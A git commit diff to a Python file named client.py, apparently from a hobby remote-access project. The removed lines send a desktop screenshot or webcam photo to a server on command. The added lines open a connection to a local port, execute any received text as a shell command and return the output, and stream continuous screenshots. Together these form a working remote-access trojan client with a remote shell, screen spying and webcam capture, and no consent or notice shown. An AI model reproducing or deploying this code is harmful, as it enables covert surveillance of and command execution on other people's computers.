92649ccb94cb045996fab81f4133498f2c161a1b
dimagamera <46674070+dimagamera@users.noreply.github.com>
2021-06-11 22:38:05 +0300

    Update client.py

--- client.py
+++ client.py
@@ -1,47 +1,36 @@
-from socket import *
-import sys
-import pyautogui
-import numpy as np
 import cv2
-host = 'localhost'
-port = 6522
-addr = (host,port)
-while True:
-	try:
-		tcp_socket = socket(AF_INET, SOCK_STREAM)
-		tcp_socket.connect(addr)
-		data = "Connected"
-		if not data : 
-		    tcp_socket.close() 
-		    sys.exit(1)
+import numpy as np
+import socket
+import sys
+import pickle
+import struct
+import pyautogui
+import time
+from PIL import Image
 
-		data = str.encode(data)
-		tcp_socket.send(data)
-		data = bytes.decode(data)
-		data = tcp_socket.recv(1024)
-		data = data.decode()
-		if data == "1":
-			scr = pyautogui.screenshot()
-			scr.save('screen.png')
-			screen = open("screen.png", "rb")
-			image_data = screen.read(2048)
-			while image_data:
-				tcp_socket.send(image_data)
-				image_data = screen.read(2048)
-		elif data == "2":
-			videoCaptureObject = cv2.VideoCapture(0)
-			result = True
-			while(result):
-				ret,frame = videoCaptureObject.read()
-				cv2.imwrite("NewPicture.jpg",frame)
-				result = False
-			videoCaptureObject.release()
-			cv2.destroyAllWindows()
-			photo = open("NewPicture.jpg", "rb")
-			image_data = photo.read(2048)
-			while image_data:
-				tcp_socket.send(image_data)
-				image_data = photo.read(2048)
-		tcp_socket.close()	
-	except:
-		pass
+import subprocess
+
+host = '127.0.0.1'
+port = 3333
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((host, port))
+
+while True:
+	a = s.recv(1024)
+	a = a.decode()
+	if a == '/cmd':
+		cmd = s.recv(1024)
+		cmd = cmd.decode()
+		cmd_process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
+		cmd_process = cmd_process.stdout + cmd_process.stderr
+		s.send(cmd_process)
+	elif a == "/share":
+		while True:
+			image = pyautogui.screenshot()
+			image = image.resize((1366, 768), Image.ANTIALIAS)
+			image = np.array(image)
+			img = Image.frombytes('RGB', (1366, 768), image)
+			data = pickle.dumps(np.array(img))
+			s.sendall(struct.pack("L", len(data)) + data)
